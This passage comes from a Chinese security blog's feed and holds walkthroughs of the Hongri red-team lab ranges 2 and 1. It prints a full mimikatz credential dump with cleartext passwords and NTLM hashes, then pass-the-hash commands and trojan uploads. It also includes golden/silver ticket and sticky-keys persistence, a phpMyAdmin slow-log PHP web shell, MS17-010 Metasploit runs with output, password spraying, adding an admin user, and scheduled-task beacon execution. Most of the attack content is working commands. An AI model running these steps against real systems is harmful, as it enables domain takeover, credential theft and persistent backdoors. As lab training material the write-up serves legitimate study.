ab ed a9 1e 54 cc 1a 36 49 e4 62 53 a1 87 29 cc ee e7 62 33 65 6f 1b 05 bc 9a 11 5a ad a9 2b 18 35 1d 29 94 22 f8 87 84 20 f0 39 99 8d 15 bb 6e d5 fe 22 aa f2 44 b3 91 43 68 5e ee f6 f6 55 a9 25 1d 7c 17 3f 1e 09 28 cc 41 52 ea c5 29 a8 d7 13 f3 15 de ed 1a 13 1b a8 91 b5 fb a1 1f 27 24 a5 80 58 4f 62 54 f4 ef 94 86 ea 41 36 d6 a3 89 87 61 a2 de de 9b ac 52 ed     ssp :    credman :Authentication Id : 0 ; 13459013 (00000000:00cd5e45)Session           : NewCredentials from 0User Name         : AdministratorDomain            : DE1AYLogon Server      : (null)Logon Time        : 2023/12/12 19:41:27SID               : S-1-5-21-2756371121-2868759905-3853650604-500    msv :     [00000003] Primary     * Username : administrator     * Domain   : owa.god.org     * NTLM     : c377ba8a4dd52401bc404dbe49771bbc    tspkg :     * Username : administrator     * Domain   : owa.god.org     * Password : (null)    wdigest :     * Username : administrator     * Domain   : owa.god.org     * Password : (null)    kerberos :     * Username : administrator     * Domain   : owa.god.org     * Password : (null)    ssp :     [00000000]     * Username : administrator     * Domain   : (null)     * Password : qwe123!@#    credman :Authentication Id : 0 ; 2701137 (00000000:00293751)Session           : RemoteInteractive from 2User Name         : qingfengDomain            : WEBLogon Server      : WEBLogon Time        : 2023/12/12 16:29:39SID               : S-1-5-21-3767205380-3469466069-2137393323-1007    msv :     [00000003] Primary     * Username : qingfeng     * Domain   : WEB     * LM       : 1319b0fa23c89f2d7e51f0bf38bde884     * NTLM     : 6912928308e3cda903e6d75bd6091a20     * SHA1     : 4687d6f9b23b55f21825bc5157fe2cbe707c07de    tspkg :     * Username : qingfeng     * Domain   : WEB     * Password : qwer1234!    wdigest :     * Username : qingfeng     * Domain   : WEB     * Password : qwer1234!    kerberos :     * Username : qingfeng     * Domain   : WEB     * Password : qwer1234!    ssp :    credman :Authentication Id : 0 ; 1452491 (00000000:001629cb)Session           : Service from 0User Name         : DefaultAppPoolDomain            : IIS APPPOOLLogon Server      : (null)Logon Time        : 2023/12/12 16:06:55SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415    msv :     [00000003] Primary     * Username : WEB$     * Domain   : DE1AY     * NTLM     : 124f918941c21f51bfe68f4e2a59b2fc     * SHA1     : 5c04dc8560a5c060d61b5b66ce973837be30a524    tspkg :     * Username : WEB$     * Domain   : DE1AY     * Password : a6 11 f4 bb c7 69 8e 43 cb 12 d0 8e 40 1d e5 71 0e 3a 24 27 79 79 3b 66 b1 85 c8 d4 3b 19 0d 25 34 75 87 d7 79 d9 44 fd 28 da 61 26 36 3c 34 32 f5 05 fb 65 fc 15 cc 35 7c 77 1f 27 4a 0d 22 8c 59 89 9d 9a 5d 3c d7 5b 1c 80 97 a0 a8 c5 b5 db 93 c6 16 e4 ca 18 a9 f9 1f 84 1d 73 2b 7d 33 c8 22 cb 30 ec 94 02 69 ec ee 6c 29 8a 2e 98 29 9a 5c 30 e2 e2 96 49 f1 ab ed a9 1e 54 cc 1a 36 49 e4 62 53 a1 87 29 cc ee e7 62 33 65 6f 1b 05 bc 9a 11 5a ad a9 2b 18 35 1d 29 94 22 f8 87 84 20 f0 39 99 8d 15 bb 6e d5 fe 22 aa f2 44 b3 91 43 68 5e ee f6 f6 55 a9 25 1d 7c 17 3f 1e 09 28 cc 41 52 ea c5 29 a8 d7 13 f3 15 de ed 1a 13 1b a8 91 b5 fb a1 1f 27 24 a5 80 58 4f 62 54 f4 ef 94 86 ea 41 36 d6 a3 89 87 61 a2 de de 9b ac 52 ed     wdigest :     * Username : WEB$     * Domain   : DE1AY     * Password : a6 11 f4 bb c7 69 8e 43 cb 12 d0 8e 40 1d e5 71 0e 3a 24 27 79 79 3b 66 b1 85 c8 d4 3b 19 0d 25 34 75 87 d7 79 d9 44 fd 28 da 61 26 36 3c 34 32 f5 05 fb 65 fc 15 cc 35 7c 77 1f 27 4a 0d 22 8c 59 89 9d 9a 5d 3c d7 5b 1c 80 97 a0 a8 c5 b5 db 93 c6 16 e4 ca 18 a9 f9 1f 84 1d 73 2b 7d 33 c8 22 cb 30 ec 94 02 69 ec ee 6c 29 8a 2e 98 29 9a 5c 30 e2 e2 96 49 f1 ab ed a9 1e 54 cc 1a 36 49 e4 62 53 a1 87 29 cc ee e7 62 33 65 6f 1b 05 bc 9a 11 5a ad a9 2b 18 35 1d 29 94 22 f8 87 84 20 f0 39 99 8d 15 bb 6e d5 fe 22 aa f2 44 b3 91 43 68 5e ee f6 f6 55 a9 25 1d 7c 17 3f 1e 09 28 cc 41 52 ea c5 29 a8 d7 13 f3 15 de ed 1a 13 1b a8 91 b5 fb a1 1f 27 24 a5 80 58 4f 62 54 f4 ef 94 86 ea 41 36 d6 a3 89 87 61 a2 de de 9b ac 52 ed     kerberos :     * Username : WEB$     * Domain   : de1ay.com     * Password : a6 11 f4 bb c7 69 8e 43 cb 12 d0 8e 40 1d e5 71 0e 3a 24 27 79 79 3b 66 b1 85 c8 d4 3b 19 0d 25 34 75 87 d7 79 d9 44 fd 28 da 61 26 36 3c 34 32 f5 05 fb 65 fc 15 cc 35 7c 77 1f 27 4a 0d 22 8c 59 89 9d 9a 5d 3c d7 5b 1c 80 97 a0 a8 c5 b5 db 93 c6 16 e4 ca 18 a9 f9 1f 84 1d 73 2b 7d 33 c8 22 cb 30 ec 94 02 69 ec ee 6c 29 8a 2e 98 29 9a 5c 30 e2 e2 96 49 f1 ab ed a9 1e 54 cc 1a 36 49 e4 62 53 a1 87 29 cc ee e7 62 33 65 6f 1b 05 bc 9a 11 5a ad a9 2b 18 35 1d 29 94 22 f8 87 84 20 f0 39 99 8d 15 bb 6e d5 fe 22 aa f2 44 b3 91 43 68 5e ee f6 f6 55 a9 25 1d 7c 17 3f 1e 09 28 cc 41 52 ea c5 29 a8 d7 13 f3 15 de ed 1a 13 1b a8 91 b5 fb a1 1f 27 24 a5 80 58 4f 62 54 f4 ef 94 86 ea 41 36 d6 a3 89 87 61 a2 de de 9b ac 52 ed     ssp :    credman :Authentication Id : 0 ; 793579 (00000000:000c1beb)Session           : Interactive from 1User Name         : AdministratorDomain            : DE1AYLogon Server      : DCLogon Time        : 2023/12/12 16:01:44SID               : S-1-5-21-2756371121-2868759905-3853650604-500    msv :     [00000003] Primary     * Username : Administrator     * Domain   : DE1AY     * LM       : f67ce55ac831223dc187b8085fe1d9df     * NTLM     : 161cff084477fe596a5db81874498a24     * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d    tspkg :     * Username : Administrator     * Domain   : DE1AY     * Password : 1qaz@WSX    wdigest :     * Username : Administrator     * Domain   : DE1AY     * Password : 1qaz@WSX    kerberos :     * Username : Administrator     * Domain   : de1ay.com     * Password : 1qaz@WSX    ssp :    credman :</code></pre><p>可以注意到这里有多个administrator，到底选择哪一个呢？</p><p>会抓到多个是因为administrator修改过密码，而之前的密码信息还保存在内存中，所以可以看到多个结果</p><p>正确的结果往往是靠前的那个，表示是最新的。</p><h3 id="横向getshell"><a href="#横向getshell" class="headerlink" title="横向getshell"></a>横向getshell</h3><p>这里我们选择就是靠前的NTLM进行横向：</p><p>c377ba8a4dd52401bc404dbe49771bbc</p><p>横向命令：</p><pre class=" language-xml"><code class="language-xml">proxychains4 impacket-wmiexec administrator@10.10.10.10 -hashes :c377ba8a4dd52401bc404dbe49771bbc</code></pre><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212204247-gsnefrx.png" alt="image">​</p><p>这里已经就可以执行命令了，但是有个问题，如何上线呢？</p><p>Windows上线需要exe来执行木马程序，所以问题来了：如何利用Hash传递进行文件传输</p><h3 id="Hash传递文件传输"><a href="#Hash传递文件传输" class="headerlink" title="Hash传递文件传输"></a>Hash传递文件传输</h3><p>Windows天生自带SMB服务，本身就是服务于文件传输的，所以我们可以利用impacket项目的smbclient.py进行文件传输，命令如下：</p><pre class=" language-xml"><code class="language-xml">proxychains4 python smbclient.py -hashes :c377ba8a4dd52401bc404dbe49771bbc de1ay.com/administrator@10.10.10.10</code></pre><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215102252-4ruzfm3.png" alt="image">​</p><p>因为我们没有选择共享的文件夹，需要先使用shares看一下有哪些共享可以使用：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215102318-bfmvyg1.png" alt="image">​</p><p>一般来说，默认开启一个C盘共享，这里就使用use C$选择C盘根目录</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/83ccaf034441cd191c8e66a16db09f8-20231215102428-x52ahmi.png" alt="image"></p><p>尝试上传smbclient.py查看结果：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/3deaffc9816ab19e12a5b913604aba0-20231215102452-iy4knfm.png" alt="image"></p><p>发现可用，我们就再上传一个木马程序<code>put dc.exe</code>​：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215102543-zv4cscd.png" alt="image">​</p><p>上传成功我们只要执行这个木马程序即可</p><p>返回我们刚才的smbexec-shell，然后执行C:\dc.exe即可成功上线：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215102619-51erplh.png" alt="image">​</p><h2 id="令牌-内网横向"><a href="#令牌-内网横向" class="headerlink" title="令牌-内网横向"></a>令牌-内网横向</h2><p>看了官方路线似乎是使用黄金票据的，我们结合上面的抓密码，因为外围WEB机器是Win2008R2的，是可以看到明文的</p><p>所以我们可以利用administrator的密码制作黄金票据来进行横向</p><pre class=" language-xml"><code class="language-xml">rev2self # 清空票据make_token delay.com\Administrator qwe123!@# #创建一个administrator令牌jump psexec DC smb #利用psexec横向传递DC</code></pre><p>执行成功后可以发现</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215103244-0i2y82m.png" alt="image">​</p><p>DC也成功拿下</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>权限维持无非就是制作黄金票据、白银票据、镜像劫持啥的了，还有很多，就演示这三个</p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>制作黄金票据需要krbtgt的hash值，在DC的session中导出ntlm hash就可以看见</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215103950-vhu9r0l.png" alt="image">​</p><p>SID是Run mimikaz可以看见：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104029-bfgs7yz.png" alt="image">​</p><p>然后选择一个用户制作黄金票据</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215103724-jjkj8ou.png" alt="image">​</p><p>在外围机器制作黄金票据：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104055-chfngf3.png" alt="image">​</p><p>制作成功后就有了DC的控制权限</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104131-ssxpfwd.png" alt="image">​</p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>这个白银票据似乎没有默认选项，那就手敲命令吧：</p><pre class=" language-xml"><code class="language-xml">klist purge  清除票据mimikatz kerberos::golden /user:administrator /domain:de1ay.com  /target:dc.de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604-500 /rc4:c377ba8a4dd52401bc404dbe49771bbc /services:cifs  /pttkerberos::golden /domain:域名 /sid:域sid /target:目标服务器 /service:目标服务 /rc4:目标服务器的hash /user:xxx用户名 /ptt</code></pre><p>这里演示是选择了administrator的NTML和SID</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215105235-a7iy7lw.png" alt="image">​</p><p>这里是表示生成成功了，和黄金票据一样</p><p>‍</p><h3 id="镜像劫持"><a href="#镜像劫持" class="headerlink" title="镜像劫持"></a>镜像劫持</h3><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104635-2ixrfey.png" alt="image">​</p><p>选择粘滞键当作后门：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104705-bk65you.png" alt="image">​</p><p>进入域控桌面，按五次shift即可得到命令行</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104620-r665fjo.png" alt="image">​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场1</title>
      <link href="/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/"/>
      <url>/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/</url>
      
        <content type="html"><![CDATA[<h1 id="红日靶场1"><a href="#红日靶场1" class="headerlink" title="红日靶场1"></a>红日靶场1</h1><h2 id="靶场配置"><a href="#靶场配置" class="headerlink" title="靶场配置"></a>靶场配置</h2><p>红日1共有三台主机，配置如下：</p><p>​​​​​​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210205045-r9afnyr.png" alt="image">​​​​​​</p><p>‍</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现外围主机是禁Pin的，使用fscan扫描需要带上np参数</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210202018-aqiysd9.png" alt="image">​</p><p>有3306和80服务，扫一下目录</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210202958-622rrai.png" alt="image">​</p><p>发现一个phpMyadmin，访问看看</p><h2 id="getshell外围机"><a href="#getshell外围机" class="headerlink" title="getshell外围机"></a>getshell外围机</h2><p>弱口令root&#x2F;root可以进后台：</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210202104-lt6l3k5.png" alt="image">​</p><p>这里就直接利用慢日志写shell了</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%slow_query_log%'</span><span class="token punctuation">;</span>  <span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> 开启慢查询<span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log_file<span class="token operator">=</span><span class="token string">'C:\\phpStudy\\WWW\\shell.php'</span><span class="token punctuation">;</span> 设置写shell路径<span class="token keyword">select</span> <span class="token string">'&lt;?php @eval($_POST[1]);?>'</span> <span class="token operator">or</span> sleep<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span> sleep时间要超过最大限制才生效</code></pre><p>之后直接利用蚁剑连接即可：</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210202414-kyqtf68.png" alt="image">​</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>ipconfig探测一下内网信息：</p><pre class=" language-xml"><code class="language-xml">C:\phpStudy\WWW> ipconfigWindows IP 配置以太网适配器 本地连接 5:   连接特定的 DNS 后缀 . . . . . . . : localdomain   本地链接 IPv6 地址. . . . . . . . : fe80::9534:7b0c:21aa:e840%26   IPv4 地址 . . . . . . . . . . . . : 192.168.120.131   子网掩码  . . . . . . . . . . . . : 255.255.255.0   默认网关. . . . . . . . . . . . . : 192.168.120.2以太网适配器 本地连接 3:   媒体状态  . . . . . . . . . . . . : 媒体已断开   连接特定的 DNS 后缀 . . . . . . . : 以太网适配器 本地连接 2:   媒体状态  . . . . . . . . . . . . : 媒体已断开   连接特定的 DNS 后缀 . . . . . . . : 以太网适配器 Bluetooth 网络连接:   媒体状态  . . . . . . . . . . . . : 媒体已断开   连接特定的 DNS 后缀 . . . . . . . : 以太网适配器 本地连接:   连接特定的 DNS 后缀 . . . . . . . :    本地链接 IPv6 地址. . . . . . . . : fe80::b022:79c6:8704:ef83%11   IPv4 地址 . . . . . . . . . . . . : 192.168.52.143   子网掩码  . . . . . . . . . . . . : 255.255.255.0   默认网关. . . . . . . . . . . . . : 192.168.52.2</code></pre><p>看一下杀软：</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210204508-02rg8ia.png" alt="image">​</p><p>发现这台机器没有杀软</p><p>直接上fscan开扫：</p><pre class=" language-xml"><code class="language-xml">start infoscan(icmp) Target 192.168.52.143  is alive(icmp) Target 192.168.52.138  is alive(icmp) Target 192.168.52.141  is alive[*] Icmp alive hosts len is: 3192.168.52.141:445 open192.168.52.138:445 open192.168.52.141:7002 open192.168.52.138:88 open192.168.52.141:7001 open192.168.52.143:3306 open192.168.52.143:445 open192.168.52.141:139 open192.168.52.138:139 open192.168.52.141:135 open192.168.52.143:139 open192.168.52.138:135 open192.168.52.143:135 open192.168.52.138:80 open192.168.52.143:80 open192.168.52.141:21 open192.168.52.141:8099 open192.168.52.141:8098 open[*] alive ports len is: 18start vulscan[*] NetInfo:[*]192.168.52.143   [->]stu1   [->]192.168.52.143   [->]192.168.120.131   [->]169.254.129.186[+] 192.168.52.143MS17-010(Windows 7 Professional 7601 Service Pack 1)[*] NetInfo:[*]192.168.52.138   [->]owa   [->]192.168.52.138[*] NetBios: 192.168.52.143  stu1.god.org                        Windows 7 Professional 7601 Service Pack 1 [+] 192.168.52.138MS17-010(Windows Server 2008 R2 Datacenter 7601 Service Pack 1)[*] NetBios: 192.168.52.138  [+]DC owa.god.org                   Windows Server 2008 R2 Datacenter 7601 Service Pack 1 [*] NetInfo:[*]192.168.52.141   [->]root-tvi862ubeh   [->]192.168.52.141[*] WebTitle: http://192.168.52.141:7002 code:200 len:2632   title:Sentinel Keys License Monitor[*] WebTitle: http://192.168.52.138     code:200 len:689    title:IIS7[+] 192.168.52.141MS17-010(Windows Server 2003 3790)[*] WebTitle: http://192.168.52.141:8099 code:403 len:1409   title:The page must be viewed over a secure channel[+] ftp://192.168.52.141:21:anonymous [*] WebTitle: http://192.168.52.143     code:200 len:14749  title:phpStudy 探针 2014</code></pre><p>额，有点无语住了，怎么全是MS17-010，那还有啥意义</p><p>算了，先打打试试看吧</p><p>挂个FRP代理(<a href="https://github.com/fatedier/frp/releases">Releases · fatedier&#x2F;frp (github.com)</a>)，Server：(frps.ini)</p><pre class=" language-xml"><code class="language-xml">[common]## 一、服务器的基本配置部分## 7000 是FRP服务端口，可以改bind_port = 7000## dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。dashboard_user = admindashboard_pwd = frpadmin@2022## 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆dashboard_port = 25500## 服务器和客户机之间的心跳连接heartbeat_timeout = 30#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求token=frpToken@admin2022</code></pre><p>这个本地执行</p><p>​<code>frps.exe -c frps.ini</code>​</p><p>Client:(frpc.ini)</p><pre class=" language-xml"><code class="language-xml">[common]server_addr = 192.168.251.1server_port = 7000token = frpToken@admin2022[proxy]type = tcpplugin = socks5remote_port = 25599</code></pre><p>这个传到Win7执行：</p><p>​<code>frpc.exe -c frpc.ini</code>​</p><h2 id="MS17010域控打法"><a href="#MS17010域控打法" class="headerlink" title="MS17010域控打法"></a>MS17010域控打法</h2><pre class=" language-xml"><code class="language-xml">use auxiliary/admin/smb/ms17_010_commandset rhosts 192.168.52.138 192.168.52.141set command tasklistshow optionsrun</code></pre><p>MS17-010直接打穿了：</p><pre class=" language-xml"><code class="language-xml">msf6 auxiliary(admin/smb/ms17_010_command) > run[proxychains] DLL init: proxychains-ng 4.16[proxychains] DLL init: proxychains-ng 4.16[proxychains] Strict chain  ...  192.168.120.1:25599  ...  192.168.52.138:445  ...  OK[*] 192.168.52.138:445    - Target OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1[*] 192.168.52.138:445    - Built a write-what-where primitive...[+] 192.168.52.138:445    - Overwrite complete... SYSTEM session obtained![+] 192.168.52.138:445    - Service start timed out, OK if running a command or non-service executable...[*] 192.168.52.138:445    - Getting the command output...[*] 192.168.52.138:445    - Executing cleanup...[+] 192.168.52.138:445    - Cleanup was successful[+] 192.168.52.138:445    - Command completed successfully![*] 192.168.52.138:445    - Output for "ipconfig":Windows IP �������������� ��������:   �����ض��� DNS ��׺ . . . . . . . :    �������� IPv6 ��. . . . . . . . : fe80::b84d:95ca:b6b3:6ddf%11   IPv4 �� . . . . . . . . . . . . : 192.168.52.138   ��������  . . . . . . . . . . . . : 255.255.255.0   Ĭ������. . . . . . . . . . . . . : 192.168.52.2���������� isatap.{D7C92CB6-1939-46AC-85CE-50401CEC5056}:   ý��״  . . . . . . . . . . . . : ý���ѶϿ�   �����ض��� DNS ��׺ . . . . . . . : [*] Scanned 1 of 2 hosts (50% complete)[proxychains] Strict chain  ...  192.168.120.1:25599  ...  192.168.52.141:445  ...  OK[*] 192.168.52.141:445    - Target OS: Windows Server 2003 3790[*] 192.168.52.141:445    - Filling barrel with fish... done[*] 192.168.52.141:445    - <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>----------------</span> <span class="token attr-name">|</span> <span class="token attr-name">Entering</span> <span class="token attr-name">Danger</span> <span class="token attr-name">Zone</span> <span class="token attr-name">|</span> <span class="token attr-name">----------------</span><span class="token punctuation">></span></span>[*] 192.168.52.141:445    -     [*] Preparing dynamite...[*] 192.168.52.141:445    -             Trying stick 1 (x64)...Miss[*] 192.168.52.141:445    -             [*] Trying stick 2 (x86)...Boom![*] 192.168.52.141:445    -     [+] Successfully Leaked Transaction![*] 192.168.52.141:445    -     [+] Successfully caught Fish-in-a-barrel[*] 192.168.52.141:445    - <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>----------------</span> <span class="token attr-name">|</span> <span class="token attr-name">Leaving</span> <span class="token attr-name">Danger</span> <span class="token attr-name">Zone</span> <span class="token attr-name">|</span> <span class="token attr-name">----------------</span><span class="token punctuation">></span></span>[*] 192.168.52.141:445    - Reading from CONNECTION struct at: 0x8d463d60[*] 192.168.52.141:445    - Built a write-what-where primitive...[+] 192.168.52.141:445    - Overwrite complete... SYSTEM session obtained![+] 192.168.52.141:445    - Service start timed out, OK if running a command or non-service executable...[*] 192.168.52.141:445    - Getting the command output...[*] 192.168.52.141:445    - Executing cleanup...[+] 192.168.52.141:445    - Cleanup was successful[+] 192.168.52.141:445    - Command completed successfully![*] 192.168.52.141:445    - Output for "ipconfig":Windows IP ConfigurationEthernet adapter Local Area Connection:   Connection-specific DNS Suffix  . :    IP Address. . . . . . . . . . . . : 192.168.52.141   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 192.168.52.2[*] Scanned 2 of 2 hosts (100% complete)[*] Auxiliary module execution completed[proxychains] DLL init: proxychains-ng 4.16[proxychains] DLL init: proxychains-ng 4.16[proxychains] DLL init: proxychains-ng 4.16[proxychains] DLL init: proxychains-ng 4.16[proxychains] DLL init: proxychains-ng 4.16</code></pre><h2 id="计划任务域控打法"><a href="#计划任务域控打法" class="headerlink" title="计划任务域控打法"></a>计划任务域控打法</h2><p>这里我们走CS去看看，先上线</p><p>Listen配置如图：</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210204336-3dqvdcp.png" alt="image">​</p><p>再配置一个exe木马：</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210204411-y31xc6s.png" alt="image">​</p><p>因为没有杀软限制，这里不用做免杀</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210205414-id1wnm7.png" alt="image">​</p><p>上线之后我们考虑如何做横向移动</p><p>Win7可以考虑抓密码：</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210211420-j24rvy9.png" alt="image">​</p><p>这里可以看到是<code>qwe123!@#</code>​</p><h3 id="密码碰撞"><a href="#密码碰撞" class="headerlink" title="密码碰撞"></a>密码碰撞</h3><p>利用<code>qwe123!@#</code>​做密码碰撞</p><pre class=" language-shell"><code class="language-shell">proxychains -q crackmapexec smb 192.168.52.1/24 -u 'administrator' -p 'qwe123!@#</code></pre><p>因为我这里设置问题，三台都设置了一样的，所以三台都通了</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211184811-8rqyuk2.png" alt="image">​</p><p>接下来我们就使用IPC进行横向了</p><h3 id="IPC横向"><a href="#IPC横向" class="headerlink" title="IPC横向"></a>IPC横向</h3><p>IPC横向思路：</p><p>定时任务at，计划任务schtasks，创建.bat执行命令或者.exe上线(at命令在2008R2之后启用了，还是用schtasks好点)</p><p>‍</p><p>计划任务schtasks演示</p><p>这里有两种做法，先建立IPC连接然后创建计划任务或者直接创建计划任务</p><h4 id="创建IPC连接"><a href="#创建IPC连接" class="headerlink" title="创建IPC连接"></a><strong>创建IPC连接</strong></h4><p><strong>工作组环境:</strong></p><pre><code>net use \\192.168.xx.xx\ipc$ &quot;password&quot; /user:&quot;administrator&quot;</code></pre><p><strong>域内环境:</strong></p><pre><code>net use \\192.168.xx.xx\ipc$ &quot;password&quot; /user:xxx.com\&quot;administrator&quot;</code></pre><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211190543-szga4nw.png" alt="image">​</p><p>建立成功可以使用<code>net use</code>​查看连接情况</p><p>接下来我们需要使用net time查看目标主机的时间，因为目标主机的时间不一定是走的北京时间，有时候是根本没设置的乱序时间，以便后面我们创建定时任务的时候设定开始时间，不过这里使用计划任务可以忽略这一步</p><p>因为外围机器Win7开着防火墙，无法做代理转发到CS，所以我们添加用户，上Win7的桌面把防火墙关了</p><pre class=" language-shell"><code class="language-shell">net user qingfeng qwer1234! /addnet localgroup administrators qingfeng /addREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre><p>这里的RDP也只允许本地登录，所以我们挂个代理进去连接</p><p>先挂上FRP上面写过这里不赘述了</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211194755-kb1rv6b.png" alt="image"><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211194800-1r6iydb.png" alt="image">​</p><p>添加远程桌面代理后直接连接，关掉防火墙</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211194649-jvut2cj.png" alt="image">​</p><h4 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h4><pre class=" language-shell"><code class="language-shell">schtasks /create /s 192.168.52.138 /tn backdoors /sc minute /mo 1  /tr c:\dc3.exe /ru system /f</code></pre><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211191356-e02wn7b.png" alt="image">​</p><p>成功上线</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211191046-iybdkoz.png" alt="image">​</p><p>在没有建立ipc连接时，要加上&#x2F;u和&#x2F;p参数分别设置用户名和密码。</p><p>但也有些时候，由于当前权限或组策略设置等原因，该schtasks方法远程创建计划任务可能会报错拒绝访问,这时候也需要高权限的用户帐号密码：</p><pre class=" language-shell"><code class="language-shell">schtasks /create /s 192.168.52.138 /u administrator /p qwe123!@# /tn backdoor /sc minute /mo 1 /tr c:\dc3.exe /ru system /f</code></pre><p>另一台主机(2003)利用at上线</p><pre class=" language-shell"><code class="language-shell">shell net use \\192.168.52.141 "qwe123!@#" /user:"administrator"shell copy dc3.exe \\192.168.52.141\c$shell net timeshell at \\192.168.52.141 19:40 C:\dc3.exe</code></pre><p>我这里利用at上线有点问题，会报错：</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212063112-bg5ebnx.png" alt="image">​</p><p>这里的打法还是就用ms17010吧，实在打不通</p><p>挂上proxychains4，用msf打</p><p>记得生成一个32位的马，这里的2003是x86架构的</p><pre class=" language-xml"><code class="language-xml">use auxiliary/admin/smb/ms17_010_commandset rhosts 192.168.164.156 192.168.164.161set command C:\\beacon_x86.exeshow optionsrun</code></pre><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212092802-yv0emen.png" alt="image">​</p><p>运行后成功上线：</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212092814-ttcpke3.png" alt="image">​</p><p>至此打靶完成</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212092831-zloyyws.png" 